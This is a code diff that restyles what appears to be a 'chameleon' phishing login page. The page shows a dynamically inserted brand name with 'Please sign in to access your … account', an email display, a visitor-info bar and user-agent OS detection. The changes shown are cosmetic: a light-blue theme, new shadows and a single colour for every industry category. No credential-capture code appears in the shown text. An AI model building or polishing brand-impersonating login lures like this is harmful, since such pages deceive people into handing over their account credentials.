@@ -101,19 +101,19 @@
       to { transform: rotate(360deg); }
     }
     
-    /* --- CHAMELEON CONTAINER (Professional Shadow) --- */
+    /* --- CHAMELEON CONTAINER (Professional Light Blue + Shadow) --- */
     .chameleon-container {
       width: 100%;
       max-width: 560px;
       background: #ffffff;
       border-radius: 12px;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.45), 0 8px 20px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4), 0 4px 20px rgba(0, 0, 0, 0.08);
       overflow: hidden;
       display: none;
       position: relative;
       z-index: 10;
       animation: fadeIn 0.6s ease;
-      border: 1px solid rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(200, 200, 200, 0.15);
     }
     
     @keyframes fadeIn {
@@ -121,12 +121,12 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
-    /* Brand Header */
+    /* Brand Header - Light Blue */
     .brand-header {
       padding: 20px 30px 16px;
       text-align: center;
-      border-bottom: 1px solid #e8e8e8;
-      background: #fafafa;
+      border-bottom: 1px solid #dbeafe;
+      background: #f0f7ff;
     }
     
     .brand-logo {
@@ -144,14 +144,14 @@
     
     .brand-tagline {
       font-size: 13px;
-      color: #888;
+      color: #6b7a8f;
       margin-top: 2px;
       font-weight: 400;
     }
     
     /* Visitor Info Bar */
     .visitor-info {
-      background: #f5f7fa;
+      background: #f8fafc;
       padding: 8px 20px;
       display: flex;
       flex-wrap: wrap;
@@ -204,7 +204,7 @@
     }
     
     .email-display {
-      background: #f0f4ff;
+      background: #f0f7ff;
       padding: 10px 16px;
       border-radius: 6px;
       font-size: 15px;
@@ -497,7 +497,6 @@
     function getOSInfo() {
       const ua = navigator.userAgent;
       if (ua.includes('Windows')) {
-        // Check for Windows 10/11
         if (ua.includes('Windows NT 10.0')) return { name: 'Windows 10', icon: 'fa-windows' };
         if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
         if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
@@ -581,12 +580,17 @@
         document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
         document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
         
-        // Dynamic color
+        // Dynamic color - Light Blue Theme
         const colors = {
-          'concrete': '#2d6a4f', 'coatings': '#1a5a8c', 'construction': '#e67e22',
-          'realestate': '#8e44ad', 'finance': '#2ecc71', 'health': '#e74c3c',
-          'tech': '#3498db', 'instrument': '#4a6cf7',
-          'default': '#4a6cf7'
+          'concrete': '#4a90d9',
+          'coatings': '#4a90d9',
+          'construction': '#4a90d9',
+          'realestate': '#4a90d9',
+          'finance': '#4a90d9',
+          'health': '#4a90d9',
+          'tech': '#4a90d9',
+          'instrument': '#4a90d9',
+          'default': '#4a90d9'
         };
         let color = colors['default'];
         for (const [key, value] of Object.entries(colors)) {
